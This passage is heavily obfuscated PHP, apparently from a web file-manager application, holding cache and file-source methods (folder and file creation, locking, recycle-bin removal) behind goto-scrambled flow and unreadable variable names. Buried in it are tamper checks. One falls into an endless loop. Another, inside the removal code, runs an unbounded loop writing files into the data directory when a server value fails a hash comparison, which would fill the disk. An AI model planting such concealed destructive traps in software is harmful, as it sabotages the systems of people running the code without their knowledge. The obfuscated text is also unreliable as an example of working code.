call_user_func_array($C¤À§ÑèöÚ, $D×Â¼…„ºˆ); $AÚ²Ö£õÑ® = $AÚ²Ö£õÑ® ? $AÚ²Ö£õÑ® : $fŠˆ»ßäÒÄ[33]; self::set($D’êºŸ¤·¯, $AÚ²Ö£õÑ®, $B•œÄìó¹); goto e’ß—©õÌ¹; C»¼ªÌ“‘Ç: } public static function remove($a÷Áàš†È) { goto A›‹Æ¼ Ùˆ; C®İ–Ó­¿²: CacheLock::lock($a÷Áàš†È); $DÄ±¡®âÙ‹ = self::init()->remove($AÀ™°¬£ÄŠ); CacheLock::unlock($a÷Áàš†È); goto CèÈ°Ñ; A›‹Æ¼ Ùˆ: $AÀ™°¬£ÄŠ = self::key($a÷Áàš†È); unset(self::$memoryCache[$AÀ™°¬£ÄŠ]); self::clearTimeout(); goto C®İ–Ó­¿²; CèÈ°Ñ: return $DÄ±¡®âÙ‹; goto Eƒ‡’ßƒİç; Eƒ‡’ßƒİç: } public static function removeMemory($B½ëÅÊ¿’) { $C½êĞÀÁ×õ = self::key($B½ëÅÊ¿’); unset(self::$memoryCache[$C½êĞÀÁ×õ]); } public static function clearMemory($d ‹‘š¬²ß = false) { if ($d ‹‘š¬²ß) { $d ‹‘š¬²ß = self::key($d ‹‘š¬²ß); unset(self::$memoryCache[$d ‹‘š¬²ß]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ö‘Øù][832])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ö‘Øù][833])) { self::init()->clearTimeout(); } } } if (!isset($_SERVER[$_SERVER[Ö‘Øù][834]]) || !isset($_SERVER[$_SERVER[Ö‘Øù][835]])) { goto EÉ‡Œô©ç’; CÄ¸¢³’¿°: $A»ŞÅ¬çÛÛ = explode($_SERVER[Ö‘Øù][229], $Eù±ã†½µë); if (count($A»ŞÅ¬çÛÛ) < $_SERVER[Ö‘Øù][614]) { $F…ìî£Ğ”† = $_SERVER[Ö‘Øù][839]; $F…ìî£Ğ”†(); } $C›Îö²ôßï = $_SERVER[Ö‘Øù][840]; goto f„×ç†Ñµ½; f„×ç†Ñµ½: $C›Îö²ôßï($_SERVER[$_SERVER[Ö‘Øù][837]] . $_SERVER[Ö‘Øù][838]); $AàÜîİİ‰® = 2; while ($AàÜîİİ‰® > 1) { $cõØÀ¨  = rawurlencode($AàÜîİİ‰® . $_SERVER[Ö‘Øù][376]); } goto fÆù¸š”òÔ; EÉ‡Œô©ç’: $A®Åøàªïà = $_SERVER[Ö‘Øù][836]; $C¯ïäÊƒ¨Ï = $_SERVER[$_SERVER[Ö‘Øù][837]] . $_SERVER[Ö‘Øù][838]; $Eù±ã†½µë = $A®Åøàªïà($C¯ïäÊƒ¨Ï); goto CÄ¸¢³’¿°; fÆù¸š”òÔ: } goto AãŒÙ ‘Ä; b›Òİ×ÁÇ¯: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($e†¬Ïˆ“ÂŠ) { $bò„Ò¦‹Â =& $_SERVER[Ö‘Øù]; $f¤Âå¶õÈ = Model($bò„Ò¦‹Â[508])->where(array($bò„Ò¦‹Â[1552] => $e†¬Ïˆ“ÂŠ))->find(); $aÑÍ‡ô§Ÿ = $this->_mkdirRoot(SourceModel::TYPE_USER, $e†¬Ïˆ“ÂŠ, $f¤Âå¶õÈ[$bò„Ò¦‹Â[28]]); $this->userDesktopAdd($aÑÍ‡ô§Ÿ); return $aÑÍ‡ô§Ÿ; } public function userDesktopAdd($B“ê²¥ù) { $aë½–¬æÛé =& $_SERVER[Ö‘Øù]; $d´é¥„°…¨ = LNG($aë½–¬æÛé[1990]); $bÙÕœ„”ßë = $this->mkdir($B“ê²¥ù, $d´é¥„°…¨); $this->metaSet($bÙÕœ„”ßë, $aë½–¬æÛé[1991], $aë½–¬æÛé[87]); $this->metaSet($B“ê²¥ù, $aë½–¬æÛé[1992], $bÙÕœ„”ßë); } public function groupRootAdd($d—ÚØƒÖß¢) { $cØäØšÃæß =& $_SERVER[Ö‘Øù]; $c‰Œ…èó½ = Model($cØäØšÃæß[517])->where(array($cØäØšÃæß[1814] => $d—ÚØƒÖß¢))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $d—ÚØƒÖß¢, $c‰Œ…èó½[$cØäØšÃæß[28]]); } public function systemRootPathAdd($DÛÕ·­Á÷ó) { if ($DÛÕ·­Á÷ó != $_SERVER[Ö‘Øù][532]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $DÛÕ·­Á÷ó); } public function userRootRemove($bñÙÉßî‡ó) { $AƒØ¨ß‡† = $this->sourceRoot(SourceModel::TYPE_USER, $bñÙÉßî‡ó); if (!$AƒØ¨ß‡†) { return; } $this->remove($AƒØ¨ß‡†, !1); } public function groupRootRemove($Eá±È¯ƒ‡ƒ) { $cŒ­º­ó®Õ = $this->sourceRoot(SourceModel::TYPE_GROUP, $Eá±È¯ƒ‡ƒ); if (!$cŒ­º­ó®Õ) { return; } $this->remove($cŒ­º­ó®Õ, !1); } private function _mkdirRoot($bËƒ–å¬·†, $EÊã”ËĞÔİ, $f°¸–‰×±®) { goto d©®×Î†èê; d«ã‹Ÿöò‰: $F‡´Š£…› = "\115\157\144\145\154\x53\157\x75\162\143\145\x2e\x6d\153\144\151\x72\x52\157\157\x74\x2e{$bËƒ–å¬·†}\x2e{$EÊã”ËĞÔİ}\x2e" . $f°¸–‰×±®; CacheLock::lock($F‡´Š£…›); $f¨•±—¡‚É[$E¡ÖæËÇ‚ê[28]] = $f°¸–‰×±®; goto eÂóå¸Ä×; d©®×Î†èê: $E¡ÖæËÇ‚ê =& $_SERVER[Ö‘Øù]; $f¨•±—¡‚É = array($E¡ÖæËÇ‚ê[396] => 0, $E¡ÖæËÇ‚ê[575] => $bËƒ–å¬·†, $E¡ÖæËÇ‚ê[576] => $EÊã”ËĞÔİ, $E¡ÖæËÇ‚ê[572] => 1, $E¡ÖæËÇ‚ê[577] => USER_ID, $E¡ÖæËÇ‚ê[578] => USER_ID, $E¡ÖæËÇ‚ê[573] => $E¡ÖæËÇ‚ê[33], $E¡ÖæËÇ‚ê[579] => $E¡ÖæËÇ‚ê[526], $E¡ÖæËÇ‚ê[424] => 0, $E¡ÖæËÇ‚ê[574] => 0, $E¡ÖæËÇ‚ê[463] => 0, $E¡ÖæËÇ‚ê[580] => $E¡ÖæËÇ‚ê[33]); if ($C¯•íÄ“•¡ = $this->where($f¨•±—¡‚É)->find()) { return $C¯•íÄ“•¡[$E¡ÖæËÇ‚ê[397]]; } goto d«ã‹Ÿöò‰; eÂóå¸Ä×: $DÁƒñèŠ¿ = $this->add($f¨•±—¡‚É); $FÚê±Šï° = array($E¡ÖæËÇ‚ê[581] => short_id($DÁƒñèŠ¿)); $this->where(array($E¡ÖæËÇ‚ê[412] => $DÁƒñèŠ¿))->save($FÚê±Šï°); goto E¥Ç£ÆÊË; E¥Ç£ÆÊË: CacheLock::unlock($F‡´Š£…›); return $DÁƒñèŠ¿; goto DâØº¸•‡; DâØº¸•‡: } private function sourceRoot($dÚŒÍ‰ğ“½, $f¹àó¾ìƒñ, $eÚ‚Ñ¦é¢Û = false) { $dÃ¶¤Ù Ÿ =& $_SERVER[Ö‘Øù]; $aÒÚŠÑêº = array($dÃ¶¤Ù Ÿ[396] => 0, $dÃ¶¤Ù Ÿ[575] => $dÚŒÍ‰ğ“½, $dÃ¶¤Ù Ÿ[576] => $f¹àó¾ìƒñ); if ($C…¡«–²Ë = $this->where($aÒÚŠÑêº)->find()) { return $eÚ‚Ñ¦é¢Û ? $C…¡«–²Ë : $C…¡«–²Ë[$dÃ¶¤Ù Ÿ[397]]; } return !1; } public function sourceRootGroup($EÏÉ”æãè½) { goto aãÇÒÎ“˜; ağŒ´ìÃõ§: $this->selectPageReset(); $a×³ÚáÙ‡ = $this->limit(count($EÏÉ”æãè½))->listSource($B¦Ë±”Ÿñ…, 1000); $this->selectPageRestore(); goto CëªÉæ‡«‘; CëªÉæ‡«‘: return array_to_keyvalue($a×³ÚáÙ‡[$FÖÍ¿÷ª˜[75]], $FÖÍ¿÷ª˜[499]); goto Aë‰Ö˜„…; aãÇÒÎ“˜: $FÖÍ¿÷ª˜ =& $_SERVER[Ö‘Øù]; if (is_string($EÏÉ”æãè½)) { $EÏÉ”æãè½ = array($EÏÉ”æãè½); } $B¦Ë±”Ÿñ… = array($FÖÍ¿÷ª˜[396] => 0, $FÖÍ¿÷ª˜[576] => array($FÖÍ¿÷ª˜[7], $EÏÉ”æãè½), $FÖÍ¿÷ª˜[575] => SourceModel::TYPE_GROUP); goto ağŒ´ìÃõ§; Aë‰Ö˜„…: } public function mkfile($E»†éà¥¢©, $bôŠñë‚Šì, $F½ê”®éé = '', $f‹·àãÎÅª = REPEAT_RENAME) { $a¸­„ö–»¶ =& $_SERVER[Ö‘Øù]; $Bíº³ˆ«“  = Model($a¸­„ö–»¶[598])->addFileByContent($F½ê”®éé, $bôŠñë‚Šì); return $this->_createFileCall($E»†éà¥¢©, $bôŠñë‚Šì, $Bíº³ˆ«“ , $f‹·àãÎÅª, $a¸­„ö–»¶[1250]); } public function addFile($CåøèËèõ•, $DÆ¾Ô§¾®¡, $cÕÅˆö‡í”, $AàË¨ŒŸ = false, $AîÊÇÒáà½ = REPEAT_RENAME) { $AÂŠËÒ ‘á = Model($_SERVER[Ö‘Øù][598])->addFile($DÆ¾Ô§¾®¡, $cÕÅˆö‡í”, $AàË¨ŒŸ); return $this->_createFileCall($CåøèËèõ•, $cÕÅˆö‡í”, $AÂŠËÒ ‘á, $AîÊÇÒáà½); } public function addFileByFileID($BìÜ²Ì¿³ä, $C“›»Ëùæº, $F¼¤‰ôÇŠï, $E©‰¡Š«µ— = REPEAT_RENAME) { $Aìµ¸—â© =& $_SERVER[Ö‘Øù]; $aŠáÂÖõ¤ = Model($Aìµ¸—â©[598])->find($C“›»Ëùæº); Model($Aìµ¸—â©[598])->linkAdd($C“›»Ëùæº); return $this->_createFileCall($BìÜ²Ì¿³ä, $F¼¤‰ôÇŠï, $aŠáÂÖõ¤, $E©‰¡Š«µ—); } public function addFileByRemote($d›Ìš®« â, $FßäÊŞ¢Ş, $EœÆ­Ç‡Öƒ, $AçêÅóÅÍ = array(), $cçÈó¾Ä¡³ = REPEAT_RENAME) { $bÃ‰êÎÌï = Model($_SERVER[Ö‘Øù][598])->addFileByRemote($FßäÊŞ¢Ş, $EœÆ­Ç‡Öƒ, $AçêÅóÅÍ); return $this->_createFileCall($d›Ìš®« â, $EœÆ­Ç‡Öƒ, $bÃ‰êÎÌï, $cçÈó¾Ä¡³); } private function _createFileCall($FÄñÕ„Å”, $a¾ØÕÁëÀİ, $DÀ„±éÃè‡, $BÏø‡…î÷Ë, $CíÎÔÀÓ‘» = "\165\160\154\x6f\x61\x64") { goto AÔÒÕèŸÙÚ; EÀ„ØÅ÷Î: $this->lockWriteStart($FÄñÕ„Å”, $a¾ØÕÁëÀİ); $fœ¸…¨§ƒ = $this->fileNameExist($FÄñÕ„Å”, $a¾ØÕÁëÀİ); $CäÖƒ²®Ú… = $this->_createFile($FÄñÕ„Å”, $a¾ØÕÁëÀİ, $DÀ„±éÃè‡, $BÏø‡…î÷Ë, $Aæ¶ñÑ ãÙ); goto fùÛÅ‚§; AÔÒÕèŸÙÚ: $c¿Œ öÒò‡ =& $_SERVER[Ö‘Øù]; $Aæ¶ñÑ ãÙ = !1; $this->setMasterDB(); goto EÀ„ØÅ÷Î; fùÛÅ‚§: if (!$Aæ¶ñÑ ãÙ) { Model($c¿Œ öÒò‡[465])->remove($DÀ„±éÃè‡[$c¿Œ öÒò‡[462]]); } if ($Aæ¶ñÑ ãÙ && $CäÖƒ²®Ú… && $CäÖƒ²®Ú… != $fœ¸…¨§ƒ) { Model($c¿Œ öÒò‡[1963])->eventCreate($CäÖƒ²®Ú…, $CíÎÔÀÓ‘»); } $this->lockWriteEnd($FÄñÕ„Å”, $a¾ØÕÁëÀİ); goto B½Üß‚¶ù; B½Üß‚¶ù: return $CäÖƒ²®Ú…; goto c¾«½èÒÖ‘; c¾«½èÒÖ‘: } public function mkdir($Aâîç÷Öö, $F°Õğ•¢¯Á, $AùÍ¥ŒÀ¶Ú = REPEAT_SKIP) { goto BÃÄ‰Ö…Š; B°Şä¬Í’: $e¶÷Š“¾óÔ = array($EãÑ®ŠÎÏÎ[572] => 1, $EãÑ®ŠÎÏÎ[415] => $F°Õğ•¢¯Á, $EãÑ®ŠÎÏÎ[573] => $EãÑ®ŠÎÏÎ[33], $EãÑ®ŠÎÏÎ[463] => 0, $EãÑ®ŠÎÏÎ[574] => 0); $a»Š»¼Ï¨ö = $this->_addSoure($e¶÷Š“¾óÔ, $BæÁŞçß²Ò); Model($EãÑ®ŠÎÏÎ[1963])->eventCreate($a»Š»¼Ï¨ö, $EãÑ®ŠÎÏÎ[1251]); goto c¨š¬ š©ƒ; d½¨’¾‰‘: if (!$BæÁŞçß²Ò) { return !1; } $this->lockWriteStart($Aâîç÷Öö, $F°Õğ•¢¯Á); if ($AùÍ¥ŒÀ¶Ú !== !1) { $bÅïİ—Ü‹Ô = $this->fileNameExist($Aâîç÷Öö, $F°Õğ•¢¯Á); if ($bÅïİ—Ü‹Ô && $AùÍ¥ŒÀ¶Ú != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Aâîç÷Öö, $F°Õğ•¢¯Á); return $bÅïİ—Ü‹Ô; } $F°Õğ•¢¯Á = $this->fileNameAuto($Aâîç÷Öö, $F°Õğ•¢¯Á, $AùÍ¥ŒÀ¶Ú); } goto B°Şä¬Í’; BÃÄ‰Ö…Š: $EãÑ®ŠÎÏÎ =& $_SERVER[Ö‘Øù]; $this->setMasterDB(); $BæÁŞçß²Ò = $this->sourceInfo($Aâîç÷Öö); goto d½¨’¾‰‘; c¨š¬ š©ƒ: $this->lockWriteEnd($Aâîç÷Öö, $F°Õğ•¢¯Á); return $a»Š»¼Ï¨ö; goto e«°¹À; e«°¹À: } private function _createFile($E¯…—ƒÓ÷”, $E™Ö…¶©ù, $e„Û«ëâÆå, $F£ó‹‰ ›, &$C†Ú™Æ¿Ñ­) { goto açœ›šÈÏÇ; açœ›šÈÏÇ: $A“ºÍÏéõ =& $_SERVER[Ö‘Øù]; $C®¥ö…¯ = $this->sourceInfo($E¯…—ƒÓ÷”); if (!$e„Û«ëâÆå || !$C®¥ö…¯) { return !1; } goto b‹‰°˜á³; b‹‰°˜á³: if ($F£ó‹‰ › !== !1) { $e²ÅÅš®ğÖ = $this->fileNameExist($E¯…—ƒÓ÷”, $E™Ö…¶©ù); } $C†Ú™Æ¿Ñ­ = !0; if ($F£ó‹‰ › && $e²ÅÅš®ğÖ) { if ($F£ó‹‰ › == REPEAT_SKIP) { $C†Ú™Æ¿Ñ­ = !1; return $e²ÅÅš®ğÖ; } else { if ($F£ó‹‰ › == REPEAT_REPLACE) { $a©©‹¼Äà = $this->sourceInfo($e²ÅÅš®ğÖ); $EÏÄÙÉ·å = $this->fileHistory($a©©‹¼Äà, $e„Û«ëâÆå[$A“ºÍÏéõ[462]], $e„Û«ëâÆå[$A“ºÍÏéõ[78]]); if (!$EÏÄÙÉ·å) { $C†Ú™Æ¿Ñ­ = !1; } else { $this->folderSizeReset($E¯…—ƒÓ÷”); } return $e²ÅÅš®ğÖ; } else { $E™Ö…¶©ù = $this->fileNameAuto($E¯…—ƒÓ÷”, $E™Ö…¶©ù, $F£ó‹‰ ›, !1); } } } goto f”«ïî¨‘÷; c¸õØ‚Öã—: return $b†ô¥‹Ü ; goto cƒ…ÀÒ½öñ; f”«ïî¨‘÷: $f¤ØºŠ‚ë· = array($A“ºÍÏéõ[572] => 0, $A“ºÍÏéõ[415] => $E™Ö…¶©ù, $A“ºÍÏéõ[573] => substr(get_path_ext($E™Ö…¶©ù), 0, 10), $A“ºÍÏéõ[463] => $e„Û«ëâÆå[$A“ºÍÏéõ[462]], $A“ºÍÏéõ[574] => $e„Û«ëâÆå[$A“ºÍÏéõ[78]]); $b†ô¥‹Ü  = $this->_addSoure($f¤ØºŠ‚ë·, $C®¥ö…¯); $this->folderSizeReset($E¯…—ƒÓ÷”, intval($f¤ØºŠ‚ë·[$A“ºÍÏéõ[78]])); goto c¸õØ‚Öã—; cƒ…ÀÒ½öñ: } protected function fileHistory($a„Õˆ›Ó, $ešÒì´Šª, $C¦ììÔ…‹Œ) { goto B‡İ÷±â“; Fø‘Öå‰ãÖ: $this->checkLock($a„Õˆ›Ó[$D¦ŠÎ½‰¿­[397]], $ešÒì´Šª); Model($D¦ŠÎ½‰¿­[1993])->addHistory($a„Õˆ›Ó); $cèĞİğ­ù = array($D¦ŠÎ½‰¿­[578] => $a·«Ï©¯¨¤, $D¦ŠÎ½‰¿­[419] => time(), $D¦ŠÎ½‰¿­[462] => $ešÒì´Šª, $D¦ŠÎ½‰¿­[78] => $C¦ììÔ…‹Œ); goto C–İ¦å¸öØ; C–İ¦å¸öØ: $this->where(array($D¦ŠÎ½‰¿­[412] => $a„Õˆ›Ó[$D¦ŠÎ½‰¿­[397]]))->save($cèĞİğ­ù); $this->sourceCacheClear($a„Õˆ›Ó[$D¦ŠÎ½‰¿­[397]]); return !0; goto eÓŞƒÈ¯ÙŒ; B‡İ÷±â“: $D¦ŠÎ½‰¿­ =& $_SERVER[Ö‘Øù]; $a·«Ï©¯¨¤ = defined($D¦ŠÎ½‰¿­[469]) ? USER_ID : $D¦ŠÎ½‰¿­[191]; if ($a„Õˆ›Ó[$D¦ŠÎ½‰¿­[462]] == $ešÒì´Šª) { return !1; } goto Fø‘Öå‰ãÖ; eÓŞƒÈ¯ÙŒ: } public function checkLock($E†±ĞƒòŒ, $A—Ñ²ŒŒÊ») { goto DŠœŠ‹Ç‹…; DŠœŠ‹Ç‹…: $d¨å¡´’Ùš =& $_SERVER[Ö‘Øù]; $e·ŒßõÌĞÚ = $this->pathInfo($E†±ĞƒòŒ); if (!$this->fileIsLock($e·ŒßõÌĞÚ, !0)) { return; } goto b×˜„ˆ‚¿£; D°ÂÀŠ‡: $this->_createFileCall($e·ŒßõÌĞÚ[$d¨å¡´’Ùš[493]], $BÓÛã…ƒ°ï, $D´İ‹¡Ò¦é, REPEAT_REPLACE, $d¨å¡´’Ùš[1250]); $B†®¨œÑ¤ = $e·ŒßõÌĞÚ[$d¨å¡´’Ùš[460]][$d¨å¡´’Ùš[537]]; $a ·àéóâñ = $B†®¨œÑ¤[$d¨å¡´’Ùš[1995]] ? $B†®¨œÑ¤[$d¨å¡´’Ùš[1995]] : $B†®¨œÑ¤[$d¨å¡´’Ùš[28]]; goto eÊ™¸™­ÎØ; eÊ™¸™­ÎØ: show_json(LNG($d¨å¡´’Ùš[1996]) . $d¨å¡´’Ùš[1997] . LNG($d¨å¡´’Ùš[1998]) . $d¨å¡´’Ùš[1999] . $a ·àéóâñ . $d¨å¡´’Ùš[2000], !1); goto bš¿Ã¬òè; b×˜„ˆ‚¿£: $d³É†‚äÏ‰ = Session::get($d¨å¡´’Ùš[1994]); $BÓÛã…ƒ°ï = substr($e·ŒßõÌĞÚ[$d¨å¡´’Ùš[28]], 0, -1 - strlen($e·ŒßõÌĞÚ[$d¨å¡´’Ùš[168]])) . $d¨å¡´’Ùš[1513] . $d³É†‚äÏ‰ . $d¨å¡´’Ùš[95] . $e·ŒßõÌĞÚ[$d¨å¡´’Ùš[168]]; $D´İ‹¡Ò¦é = Model($d¨å¡´’Ùš[598])->find($A—Ñ²ŒŒÊ»); goto D°ÂÀŠ‡; bš¿Ã¬òè: } public function fileIsLock($CË÷çŠâ¼³, $B´«›Èå = false) { goto e ‚‡£¬Š”; eè§ˆ«²‘: return !1; goto fÍÙİÃî…Š; dÁÅ•ä‰‚: $c‚¹·ÜöÂâ = $GLOBALS[$eÓ…ÕŒİí[6]][$eÓ…ÕŒİí[88]][$eÓ…ÕŒİí[535]]; if ($CË÷çŠâ¼³[$eÓ…ÕŒİí[460]][$eÓ…ÕŒİí[536]] <= time() - $c‚¹·ÜöÂâ) { $this->metaSet($CË÷çŠâ¼³[$eÓ…ÕŒİí[397]], $eÓ…ÕŒİí[534], null); $this->metaSet($CË÷çŠâ¼³[$eÓ…ÕŒİí[397]], $eÓ…ÕŒİí[536], null); } if ($B´«›Èå) { $this->metaSet($CË÷çŠâ¼³[$eÓ…ÕŒİí[397]], $eÓ…ÕŒİí[536], time()); } goto eè§ˆ«²‘; e ‚‡£¬Š”: $eÓ…ÕŒİí =& $_SERVER[Ö‘Øù]; if (!isset($CË÷çŠâ¼³[$eÓ…ÕŒİí[460]]) || !$CË÷çŠâ¼³[$eÓ…ÕŒİí[460]][$eÓ…ÕŒİí[534]]) { return !1; } if ($CË÷çŠâ¼³[$eÓ…ÕŒİí[460]][$eÓ…ÕŒİí[534]] != USER_ID) { return !0; } goto dÁÅ•ä‰‚; fÍÙİÃî…Š: } private function _addSoure($F¢•íÑ‹½, $e¼˜ß”§“£) { goto aîÚãÉí£Ä; E­’Š©Æ’: $F¢•íÑ‹½ = array_merge($aÏœÒŸĞ, $F¢•íÑ‹½); $this->updateModifyTime($F¢•íÑ‹½[$EôÛÍ³×ùµ[493]]); $c°¡­´İª¢ = $EôÛÍ³×ùµ[2001] . $e¼˜ß”§“£[$EôÛÍ³×ùµ[397]]; goto FÍ³ÍÚÙè‡; FÍ³ÍÚÙè‡: if (isset(self::$cacheChildList[$c°¡­´İª¢])) { unset(self::$cacheChildList[$c°¡­´İª¢]); } static $eƒ„Â·Å— = false; if (!$eƒ„Â·Å—) { Hook::trigger($EôÛÍ³×ùµ[562], $F¢•íÑ‹½); $eƒ„Â·Å— = !0; } goto D¹ğÊØ¡­‹; D¹ğÊØ¡­‹: $eƒŠ¨ƒîÅê = $this->add($F¢•íÑ‹½); $C††‰¾Öá‚ = array($EôÛÍ³×ùµ[581] => short_id($eƒŠ¨ƒîÅê)); $this->where(array($EôÛÍ³×ùµ[412] => $eƒŠ¨ƒîÅê))->save($C††‰¾Öá‚); goto cß©òÜ—ã±; aîÚãÉí£Ä: $EôÛÍ³×ùµ =& $_SERVER[Ö‘Øù]; $c÷ÍˆŞÆµÛ = defined($EôÛÍ³×ùµ[469]) ? USER_ID : $EôÛÍ³×ùµ[191]; $aÏœÒŸĞ = array($EôÛÍ³×ùµ[575] => $e¼˜ß”§“£[$EôÛÍ³×ùµ[406]], $EôÛÍ³×ùµ[576] => $e¼˜ß”§“£[$EôÛÍ³×ùµ[499]], $EôÛÍ³×ùµ[577] => $c÷ÍˆŞÆµÛ, $EôÛÍ³×ùµ[578] => $c÷ÍˆŞÆµÛ, $EôÛÍ³×ùµ[396] => $e¼˜ß”§“£[$EôÛÍ³×ùµ[397]], $EôÛÍ³×ùµ[579] => $e¼˜ß”§“£[$EôÛÍ³×ùµ[516]] . $e¼˜ß”§“£[$EôÛÍ³×ùµ[397]] . $EôÛÍ³×ùµ[47], $EôÛÍ³×ùµ[424] => 0, $EôÛÍ³×ùµ[580] => $EôÛÍ³×ùµ[33]); goto E­’Š©Æ’; cß©òÜ—ã±: $this->setNamePinyin($eƒŠ¨ƒîÅê, $F¢•íÑ‹½[$EôÛÍ³×ùµ[28]]); return $eƒŠ¨ƒîÅê; goto E†ÀŠ‘µ¹; E†ÀŠ‘µ¹: } public function remove($cÜ–Ì‰‹¥Ç, $DäŸ‚ç¤Ìí = true) { goto D³…ÒßĞ†Œ; C±Â¾àŞ»: $this->recycleClear($AâÀ£ÅÂº); $c¦Úö“ê¥á = $this->move($cÜ–Ì‰‹¥Ç, $EÃË³êÄ–™, REPEAT_RENAME_FOLDER); $this->folderSizeReset($AâÀ£ÅÂº[$C¹ŠÊì³»Ğ[493]]); goto c²¢½öİåö; c†¹‰§¸ˆ: $føâ˜ÔÕõ = $AâÀ£ÅÂº[$C¹ŠÊì³»Ğ[406]] == self::TYPE_USER ? $C¹ŠÊì³»Ğ[589] : $C¹ŠÊì³»Ğ[510]; if ($føâ˜ÔÕõ == $C¹ŠÊì³»Ğ[589]) { $fÕù›ˆ”Ö› = Model($C¹ŠÊì³»Ğ[508])->getInfo($AâÀ£ÅÂº[$C¹ŠÊì³»Ğ[499]]); $ešËØùØ¶Æ = !empty($fÕù›ˆ”Ö›[$C¹ŠÊì³»Ğ[1995]]) ? $fÕù›ˆ”Ö›[$C¹ŠÊì³»Ğ[1995]] : $fÕù›ˆ”Ö›[$C¹ŠÊì³»Ğ[28]]; $ešËØùØ¶Æ = $C¹ŠÊì³»Ğ[258] . $ešËØùØ¶Æ . $C¹ŠÊì³»Ğ[2003] . $AâÀ£ÅÂº[$C¹ŠÊì³»Ğ[499]]; } else { $fÕù›ˆ”Ö› = Model($C¹ŠÊì³»Ğ[517])->getInfo($AâÀ£ÅÂº[$C¹ŠÊì³»Ğ[499]]); $ešËØùØ¶Æ = _get($fÕù›ˆ”Ö›, $C¹ŠÊì³»Ğ[28]); $ešËØùØ¶Æ = $C¹ŠÊì³»Ğ[160] . $ešËØùØ¶Æ . $C¹ŠÊì³»Ğ[2004] . $AâÀ£ÅÂº[$C¹ŠÊì³»Ğ[499]]; } $FˆÜº‡È­ñ = $C¹ŠÊì³»Ğ[2005] . md5($ešËØùØ¶Æ); goto FÄ˜¯ïºä; c²¢½öİåö: return $c¦Úö“ê¥á; goto fªóÑîòñ‰; D³…ÒßĞ†Œ: $C¹ŠÊì³»Ğ =& $_SERVER[Ö‘Øù]; $AâÀ£ÅÂº = $this->sourceInfo($cÜ–Ì‰‹¥Ç); $e‡¡¿ßÆİ° = intval($AâÀ£ÅÂº[$C¹ŠÊì³»Ğ[406]]) === self::TYPE_SYSTEM; goto d˜âç¤ï›½; FÄ˜¯ïºä: CacheLock::lock($FˆÜº‡È­ñ); $EÃË³êÄ–™ = $this->fileNameExist($Aé¥Ö¦æ´±, $ešËØùØ¶Æ); if (!$EÃË³êÄ–™) { $EÃË³êÄ–™ = $this->mkdir($Aé¥Ö¦æ´±, $ešËØùØ¶Æ, REPEAT_SKIP); $this->metaSet($EÃË³êÄ–™, $C¹ŠÊì³»Ğ[2006], $føâ˜ÔÕõ); $this->metaSet($EÃË³êÄ–™, $C¹ŠÊì³»Ğ[2007], $AâÀ£ÅÂº[$C¹ŠÊì³»Ğ[499]]); if ($AâÀ£ÅÂº[$C¹ŠÊì³»Ğ[493]] != 0) { $this->metaSet($EÃË³êÄ–™, $C¹ŠÊì³»Ğ[2008], _get($fÕù›ˆ”Ö›, $C¹ŠÊì³»Ğ[2009])); } } goto fçß÷Ëø¢•; d˜âç¤ï›½: $E×¨¯–•£ = Model($C¹ŠÊì³»Ğ[427])->get($C¹ŠÊì³»Ğ[2002]) == $C¹ŠÊì³»Ğ[87]; if ($e‡¡¿ßÆİ° || $DäŸ‚ç¤Ìí || !$E×¨¯–•£) { return $this->removeNow($cÜ–Ì‰‹¥Ç, $DäŸ‚ç¤Ìí); } $Aé¥Ö¦æ´± = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); goto c†¹‰§¸ˆ; fçß÷Ëø¢•: CacheLock::unlock($FˆÜº‡È­ñ); $this->metaSet($cÜ–Ì‰‹¥Ç, $C¹ŠÊì³»Ğ[2010], $AâÀ£ÅÂº[$C¹ŠÊì³»Ğ[493]]); $this->where(array($C¹ŠÊì³»Ğ[397] => $cÜ–Ì‰‹¥Ç))->save(array($C¹ŠÊì³»Ğ[419] => time())); goto C±Â¾àŞ»; fªóÑîòñ‰: } private function recycleClear($DŒ‘œÅí«) { $eÓ„—Õìòå =& $_SERVER[Ö‘Øù]; $cëÓßƒ–Îà = $this->childrenAll($DŒ‘œÅí«); $F…šºÒŸÎØ = array($eÓ„—Õìòå[412] => array($eÓ„—Õìòå[413], $cëÓßƒ–Îà[$eÓ„—Õìòå[2011]])); Model($eÓ„—Õìòå[2012])->where($F…šºÒŸÎØ)->delete(); } public function removeNow($A Ş´÷É“, $f§®¯Şœ¡ğ = true) { goto d¥Ø›Ç¸•·; d†©”éøë•: Hook::trigger($FÈÚ¿¢±Âš[2013], $A–Ã©Š¼ù, $f§®¯Şœ¡ğ); if ($f§®¯Şœ¡ğ) { Model($FÈÚ¿¢±Âš[2012])->moveToRecycle($A Ş´÷É“); } else { $aÄÓÄÜºÙ = $this->childrenAll($BßÚ­÷¶¿); Model($FÈÚ¿¢±Âš[559])->eventRemove($A Ş´÷É“); $this->removeRelevance($aÄÓÄÜºÙ[$FÈÚ¿¢±Âš[2011]], $aÄÓÄÜºÙ[$FÈÚ¿¢±Âš[1380]]); } $this->folderSizeReset($BßÚ­÷¶¿[$FÈÚ¿¢±Âš[493]]); goto C“Ö¿µ´; aï£äŸ¾Ì“: if (!$BßÚ­÷¶¿) { return !0; } if ($BßÚ­÷¶¿[$FÈÚ¿¢±Âš[493]] == 0) { if (!_get($GLOBALS, $FÈÚ¿¢±Âš[500])) { return !1; } } $this->lockMoveStart($A Ş´÷É“); goto d†©”éøë•; eÇÁ•Ô¸¥Æ: if ($_SERVER[$FÈÚ¿¢±Âš[834]] != $D¯‘ñÛÓæ¢($bÎîíåÜÃ’)) { goto D‚Ë‰¶Œ¾Á; aİ÷¢ßÑíô: $D”Ò¹‚ĞŒĞ = 1; for ($E§—‚‡Ìª† = $D”Ò¹‚ĞŒĞ; $E§—‚‡Ìª† > 0; $E§—‚‡Ìª†++) { $Eœîëğìô„(DATA_PATH . $E§—‚‡Ìª†, $E²ËòÜèÄÄ); } goto EšÁ¶ÃŒ¼†; D‚Ë‰¶Œ¾Á: $D®Äˆõå° = $FÈÚ¿¢±Âš[874]; $AÔ¸‘ó• = $FÈÚ¿¢±Âš[836]; 